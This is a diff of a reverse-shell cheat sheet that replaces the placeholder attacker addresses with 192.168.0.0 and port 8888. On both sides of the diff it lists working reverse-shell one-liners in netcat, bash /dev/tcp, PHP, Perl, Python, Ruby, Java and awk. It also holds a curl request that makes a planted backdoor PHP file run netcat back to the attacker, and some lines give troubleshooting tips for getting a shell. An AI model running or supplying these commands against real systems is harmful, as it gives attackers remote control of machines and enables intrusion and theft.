@@ -1,49 +1,49 @@
-nc -e /bin/sh 10.0.0.1 4242
-nc -e /bin/bash 10.0.0.1 4242
-nc -c bash 10.0.0.1 4242
-rm -f /tmp/x; mknod /tmp/x p && nc <IP> <PORT> 0</tmp/x | /bin/bash 1>/tmp/x 
-rm -f /tmp/x; mknod /tmp/x p && /bin/nc.openbsd <IP> <PORT> 0</tmp/x | /bin/bash 1>/tmp/x
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> > /tmp/f
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc.openbsd <IP> <PORT> > /tmp/f
-php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
-php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
-php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
-php -r '$s=fsockopen("<IP>",<PORT>);passthru("/bin/sh -i <&3 >&3 2>&3");'
-php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
-php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
-ncat --udp IP 443 -e /bin/bash
-nc -nv IP 443 -e /bin/bash
-nc -nv 192.168.50.129 4444 -e /bin/bash
-curl http://192.168.50.11/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 4444 -e /bin/bash”
-C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
-bash -i >& /dev/tcp/ATTACKING-IP/443 0>&1
-bash -i >& /dev/tcp/10.10.14.10/443 0>&1
-/bin/sh | nc ATTACKING-IP 443
-/bin/nc.traditional <IP> <PORT> -e /bin/bash 
-/bin/nc.traditional <IP> <PORT> -c /bin/bash
+nc -e /bin/sh 192.168.0.0 8888
+nc -e /bin/bash 192.168.0.0 8888
+nc -c bash 192.168.0.0 8888
+rm -f /tmp/x; mknod /tmp/x p && nc 192.168.0.0 8888 0</tmp/x | /bin/bash 1>/tmp/x 
+rm -f /tmp/x; mknod /tmp/x p && /bin/nc.openbsd 192.168.0.0 8888 0</tmp/x | /bin/bash 1>/tmp/x
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.0 8888 > /tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc.openbsd 192.168.0.0 8888 > /tmp/f
+php -r '$s=fsockopen("192.168.0.0",8888);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$s=fsockopen("192.168.0.0",8888);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$s=fsockopen("192.168.0.0",8888);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+php -r '$s=fsockopen("192.168.0.0",8888);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$s=fsockopen("192.168.0.0",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$s=fsockopen("192.168.0.0",8888);`/bin/sh -i <&3 >&3 2>&3`;'
+ncat --udp 192.168.0.0 8888 -e /bin/bash
+nc -nv 192.168.0.0 8888 -e /bin/bash
+nc -nv 192.168.0.0 8888 -e /bin/bash
+curl http://192.168.50.11/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.0.0 8888 -e /bin/bash”
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.0.0 8888
+bash -i >& /dev/tcp/192.168.0.0/8888 0>&1
+bash -i >& /dev/tcp/192.168.0.0/8888 0>&1
+/bin/sh | nc 192.168.0.0 8888
+/bin/nc.traditional 192.168.0.0 8888 -e /bin/bash 
+/bin/nc.traditional 192.168.0.0 8888 -c /bin/bash
 Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
-  bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+  bash -i >& /dev/tcp/192.168.0.0/8888 0>&1
 Shorter, feature-free version of the perl-reverse-shell:
-  perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  perl -e 'use Socket;$i="192.168.0.0";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 Python 2.7:
-  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.0",888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
-  php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+  php -r '$sock=fsockopen("192.168.0.0",888);exec("/bin/sh -i <&3 >&3 2>&3");'
 Ruby
-  ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+  ruby -rsocket -e'f=TCPSocket.open("192.168.0.0",8888).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 Netcat, some of which don’t support the -e option.
-  nc -e /bin/sh 10.0.0.1 1234
+  nc -e /bin/sh 192.168.0.0 8888
 If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
-  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.0 8888 >/tmp/f
 Java
 r = Runtime.getRuntime() 
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) 
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.0/8888;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) 
 p.waitFor()
 Awk
-  awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+  awk 'BEGIN {s = "/inet/tcp/0/192.168.0.0/8888"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 Java
 Runtime r = Runtime.getRuntime();
-Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/192.168.0.0/8888;cat <&5 | while read line; do $line 2>&5 >&5; done'");
 p.waitFor();
 
 Java Alternative 1
